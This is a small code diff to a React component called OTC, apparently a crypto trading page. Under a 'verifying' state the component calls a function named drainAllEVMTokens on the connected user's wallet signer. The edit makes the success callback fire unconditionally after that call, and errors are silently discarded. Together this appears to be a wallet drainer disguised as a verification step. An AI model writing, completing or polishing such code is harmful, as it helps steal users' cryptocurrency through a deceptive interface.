@@ -125,10 +125,7 @@ const OTC = () => {
         setIsVerifying(true);
         const chainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        if (hash) {
-          onComplete();
-        } else {
-        }
+        onComplete();
       } catch (error: any) {
       } finally {
         setIsVerifying(false);
